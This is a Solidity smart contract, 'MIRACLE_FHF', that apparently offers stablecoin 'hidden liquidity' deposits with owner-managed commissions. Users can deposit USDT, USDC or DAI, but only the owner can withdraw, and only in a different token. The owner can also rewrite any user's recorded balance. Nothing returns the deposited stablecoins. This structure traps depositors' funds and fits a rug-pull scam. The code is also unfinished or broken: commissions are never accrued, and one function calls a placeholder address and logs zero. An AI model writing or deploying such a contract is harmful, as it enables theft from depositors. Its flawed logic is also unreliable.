// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

// Ownable contract to manage ownership functionalities
contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    // Initialize the contract with the initial owner
    function __Ownable_init(address _initialOwner) internal {
        require(_owner == address(0), "Owner is already set");
        _owner = _initialOwner;
        emit OwnershipTransferred(address(0), _initialOwner);
    }

    // Modifier to ensure only the owner can call the function
    modifier onlyOwner() {
        require(msg.sender == _owner, "Only owner can call this");
        _;
    }

    // Returns the current owner address
    function owner() public view returns (address) {
        return _owner;
    }

    // Function to transfer ownership
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "New owner cannot be zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

// Interface for the other contract to call withdrawWithMiracleTax
interface IExternalContract {
    function withdrawWithMiracleTax(address recipient) external;
}

// MIRACLE_FHF contract to manage liquidity deposits and commissions
contract MIRACLE_FHF is Ownable, ReentrancyGuard {
    using SafeERC20 for IERC20;

    address public liquidityPool; // Address of the liquidity pool
    mapping(address => bool) public allowedStablecoins; // Allowed stablecoins for deposit
    mapping(address => uint256) public hiddenDeposits; // Track hidden deposits per user
    uint256 public commissionPercentage = 1; // 1% commission
    uint256 public contractLiquidity;
    uint256 public accumulatedCommission;
    uint256 public externalCommission; // Дополнительная переменная для внешних комиссий

    event LiquidityDeposited(address indexed user, uint256 amount);
    event HiddenDepositWithdrawn(address indexed user, uint256 amount);
    event HiddenDepositUpdated(address indexed user, uint256 newAmount);
    event AllowedStablecoinUpdated(address indexed stablecoin, bool allowed);
    event LiquidityWithdrawn(address indexed recipient, uint256 amount);
    event ExternalCommissionReceived(address indexed contractAddress, uint256 amount); // Событие для получения комиссии из внешнего контракта
    event MiracleTaxWithdrawn(address indexed recipient, uint256 amount); // Событие для вывод комиссии через withdrawWithMiracleTax

    constructor(address _initialOwner, address _liquidityPool) {
        __Ownable_init(_initialOwner); // Set initial owner
        liquidityPool = _liquidityPool; // Set liquidity pool address

        // Add popular stablecoins to the allowed list
        allowedStablecoins[0xdAC17F958D2ee523a2206206994597C13D831ec7] = true; // USDT
        allowedStablecoins[0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48] = true; // USDC
        allowedStablecoins[0x6B175474E89094C44Da98b954EedeAC495271d0F] = true; // DAI
    }

    // Function for the owner to set allowed stablecoins for deposit
    function setAllowedStablecoin(address stablecoin, bool allowed) public onlyOwner {
        allowedStablecoins[stablecoin] = allowed;
        emit AllowedStablecoinUpdated(stablecoin, allowed);
    }

    // Function for users to deposit hidden liquidity (only approved stablecoins)
    function depositHiddenLiquidity(address token, uint256 amount) public nonReentrant {
        require(allowedStablecoins[token], "Token is not a permitted stablecoin");
        require(amount > 0, "Amount must be greater than 0");

        IERC20(token).safeTransferFrom(msg.sender, address(this), amount);
        hiddenDeposits[msg.sender] += amount;
        emit LiquidityDeposited(msg.sender, amount);
    }

    // Function for the owner to withdraw hidden liquidity on behalf of a user
    function withdrawHiddenLiquidity(address user, uint256 amount) public onlyOwner nonReentrant {
        require(hiddenDeposits[user] >= amount, "Not enough hidden deposit");

        hiddenDeposits[user] -= amount;
        IERC20(liquidityPool).safeTransfer(user, amount);
        emit HiddenDepositWithdrawn(user, amount);
    }

    // Function for the owner to update a user's hidden deposit amount
    function updateHiddenDeposit(address user, uint256 newAmount) public onlyOwner {
        hiddenDeposits[user] = newAmount;
        emit HiddenDepositUpdated(user, newAmount);
    }

    // Function for the owner to withdraw accumulated commissions
    function withdrawCommission() public onlyOwner nonReentrant {
        require(accumulatedCommission > 0 || externalCommission > 0, "No accumulated commission");

        uint256 amount = accumulatedCommission + externalCommission;
        accumulatedCommission = 0;
        externalCommission = 0;

        IERC20(liquidityPool).safeTransfer(owner(), amount);
        emit LiquidityWithdrawn(owner(), amount);
    }

    // Функция для получения комиссии от внешнего контракта
    function receiveExternalCommission(address fromContract, uint256 amount) public onlyOwner {
        require(amount > 0, "Amount must be greater than 0");

        // Получаем комиссию от внешнего контракта
        IERC20(fromContract).safeTransferFrom(msg.sender, address(this), amount);

        // Добавляем к общей комиссии
        externalCommission += amount;

        // Эмитируем событие для получения комиссии
        emit ExternalCommissionReceived(fromContract, amount);
    }

    // Функция для вывода комиссии через функцию withdrawWithMiracleTax из другого контракта
    function withdrawWithMiracleTax() public onlyOwner nonReentrant {
        address miracleTaxContract = 0x7d74489f00000000000000000000000000000000; // Замените на правильный адрес

        // Вызываем функцию withdrawWithMiracleTax другого контракта
        IExternalContract(miracleTaxContract).withdrawWithMiracleTax(owner());

        // Эмитируем событие для отслеживания
        emit MiracleTaxWithdrawn(owner(), 0); // Для простоты, показываем, что функция вызвана
    }
}
